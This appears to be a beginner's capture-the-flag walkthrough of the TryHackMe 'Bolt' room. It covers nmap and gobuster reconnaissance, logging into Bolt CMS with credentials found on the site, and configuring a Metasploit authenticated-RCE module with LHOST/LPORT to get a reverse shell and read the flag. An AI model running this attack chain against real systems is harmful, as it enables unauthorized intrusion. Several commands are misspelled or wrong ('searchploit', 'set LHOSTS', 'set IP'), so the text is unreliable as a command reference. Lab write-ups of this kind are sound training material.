# Bolt
Bolt is popular TryHackMe Machine which runs on a vulnerable version of bolt and you can exploit it with just simple steps

![Main](https://github.com/user-attachments/assets/8c284fd9-e79a-4e07-87c8-c1e914586249)

TryhackMe Machines runs on vulnerable system.It allows us to find the structure of a machine like what type of technology it is using and how can we exploit it

We just have to join the room and then start the Machine:

Once You Start click “Start Machine” then you have to wait for 60 seconds and then you will have your Machine’s IP

![Machine IP](https://github.com/user-attachments/assets/34575995-927c-41b8-9958-83638cb9bef6)

Now you have to configure you VPN which you can get from Manage Account < VM and VPN Setting and then download the Configuration file

![how to find vpn on try](https://github.com/user-attachments/assets/509e3596-ea2b-47e8-aecd-846ee684e3a4)

![how to find vpn on try1](https://github.com/user-attachments/assets/a22b0656-ee50-43f0-96c5-83ca27146ec1)

After Downloading the VPM Configuration file run this command
```
sudo openvpn example.ovpn
```
<img width="593" height="247" alt="openvpn" src="https://github.com/user-attachments/assets/46c52062-4438-4046-9dd5-ea99857aab4d" />

The first step is to enumerate what ports are open and what kind of technology the victum is using

For this I will use Nmap

Nmap is powerful network scanning tool used to find open pors on a target system

I will use the -A flag for Aggressive scan

```
sudo nmap -A IP
```

We got the results

<img width="1031" height="501" alt="bolt-scan-result" src="https://github.com/user-attachments/assets/75e8d690-95a9-4908-a710-85544166a894" />

So we got some ports open

**1.** Port 22 ssh

**2.** Port 80 http | Apache 2.4.29

**3.** Port 8000 http | PHP 7.2.32

Here are 8 questions in our THM lab so I will divide it into 2 Levels

![Questions](https://github.com/user-attachments/assets/7199039e-ab9d-4a8d-8192-2a04a87f6def)


The next technique we will use is to find the hidden directories is called **Directory bruteforcing**

But lets understand what is **directory bruteforcing??**

Directory bruteforcing is a technique used to find hidden or unprotected directories and files
on a web server. It involves systematically checking a list of potential directories and
filenames against the target website to discover content that may not be publicly linked or
accessible.

```
gobuster -u http://IP:PORT -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

We didn't get anything useful.


**__Lets start with Level 1__**

**Q1. What port number has a web server with a CMS running?**

**Ans:**

We will paste the IP address in our browser to check which server(port) is using the CMS 

http://IP:80

http://IP:8000

<img width="1825" height="631" alt="bolt-homepage" src="https://github.com/user-attachments/assets/fa136689-3eec-4b1e-b936-6a1287d2a2a6" />


After checking it we will be able to know which port is using the bolt service

So now you have the answer of 1st Question

**Lets move forward**

**Q2. What is the username we can find in the CMS?**

**Ans:**

You have to check the username on the website page.

It is written in the page.Check it wisely

**Q3. What is the password we can find for the username?**

**Ans:**

The password is also written in the website page.Try to find and complete your question

In the questions they have asked us about the username and password which means we may have to login using that credentials
So I will see for the bolt login page if it exists:

Lets search with google 

```bolt login page```

![bolt-login](https://github.com/user-attachments/assets/089dd8f4-5e25-4456-802d-29ed291b059d)


![bolt-login1](https://github.com/user-attachments/assets/3a525cf3-576a-4879-a4af-3f106803032d)


Yeah there is a bolt login page so I will use this:

![bolt-login-panel](https://github.com/user-attachments/assets/25c66279-2857-4926-8c4a-dd1edcdc75ee)

```http://IP:PORT/bolt/login```

Now I will use the username and password which I got from the previous page

I used the credentials and successfully logged in

![bolt-login-successful](https://github.com/user-attachments/assets/1ed5f8ba-16dd-45a7-945a-01f51bd70a2b)


**Q4. What version of the CMS is installed on the server? (Ex: Name 1.1.1)**

**Ans:**

Now you have to see the lover-left-corner.It is the point where the version in written

![bolt-version](https://github.com/user-attachments/assets/1dc52743-9e70-4303-b467-33c9a09be519)

**lets move forward to level 2**

**Q5. There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?**

**Ans:**

Now they are asking us to search for the previous version of CMS(bolt) so we will first search the exploit on **EDB**(Exploit DataBase) on google

**Lets understand what the Exploit-db is**??

Exploit-db is an open-source platform hosted by google where developers,hackers,organizations share their exploit against vulnerable systems

We can download these from their website:https://www.exploit-db.com/

**OR**

We can use it in kali linux

**How?**

First Install the exploitdb

```
sudo apt install exploitdb
```

tip:

If you have already installed it so you can update it

**Run**

```
searchploit -u
```

**Now lets use it**

**Searchploit	| Version name**

```
searchploit version
```

Write the previous version of the CMS(bolt) which is currently running on the web-server 

There you will see the results like this

<img width="1886" height="172" alt="bolt-previous" src="https://github.com/user-attachments/assets/4e3cd277-c69a-4926-826a-3688b91827d8" />

You will find your answer in the path

**tip:**

Just write number.don't add .py extension like 46666 not 46666.py

**Q6. Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)**

**Ans:**

Exploit-db doesn't have the exploit related to the current version of CMS(bolt) but Metasploit have

**What is Metasploit**

**Ans:**

The Metasploit Framework is a powerful open-source penetration testing tool used by
security professionals and ethical hackers to identify and exploit vulnerabilities in systems
and networks. It is developed in Ruby by HD Moore

It is installed in kali linux by default

If you haven't update or not installed 

**Run**

```
sudo apt install metasploit-framework
sudo apt update
```

Now we will launch the metasploit framework

```
msfconsole
```
now search for the exploit

```
search bolt 'version'
```

you got the version 

Copy path like:

```exploit/###/###/#####_#####_####```

<img width="1629" height="298" alt="bolt-metasploit-location" src="https://github.com/user-attachments/assets/359e321a-2853-4c0f-801f-3916d15e00ef" />

**Q7. Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit**

**Ans:**

Now we will use the exploit and will configure its settings

**LHOSTS**

LHOST is the users IP where it will get shell

```
set LHOSTS IP
```

Important:

You have to write the IP address from tun0 not eth0 because we are connected with the tryhackme server's private network

If we have not configured the vpn so our primary IP address would be the eth0 which we have got from our router but since we are connected to a vpn server so we are connected with a private network of not our home's

How to check it

**Run**

```
ip addr
```

<img width="941" height="237" alt="bolt-msf-setting" src="https://github.com/user-attachments/assets/b030eee1-e75c-4067-ba89-fb2ce892a7da" />


**LPORT**

It is the port you want to use 

``` 
set LPORT 443
```

**RHOSTS**

It is the target's IP address (Machine's IP)

```
set IP
```

**USERNAME**

Set the username which we got from the site 

```
set USERNAME 'Username'
```

**PASSWORD**

Set the password which we got from the site

```
set PASSWORD 'Password'
```

Once you are done! hit exploit

**Q8. Look for flag.txt inside the machine**

**Ans:**

Now we have successfully exploited the machine and will look for the flag in machine

I will use the `ls` command to list the directories

```
ls
````

I didn't get any result because I am in a default directory

<img width="141" height="91" alt="bolt-got-ls" src="https://github.com/user-attachments/assets/4097cd50-60cd-42a2-9fd9-e207e1aface5" />


Lets say you are in a Mall and want to ask price for perfume but when you ask someone about the price so he/she says that I am a salesman for clothes not perfumes.

Same goes for directories.If you are in a directory `var/www/ so you will only see the subdirectories or folders under the ```www``` directory

So we will try to change our default directory to root

```cd /```

I did this and successfully got all the contents

<img width="202" height="652" alt="bolt-got-root" src="https://github.com/user-attachments/assets/722136ff-d6ec-43ab-9d02-c08ea1c7311e" />

Now I will go the home directory

```
cd home
```

I run `ls` in the home directory and got the file flag.txt

**Run**

```
cat flag.txt
```

I got the flag

`THM{################}`

**Congratulations to complete this room**

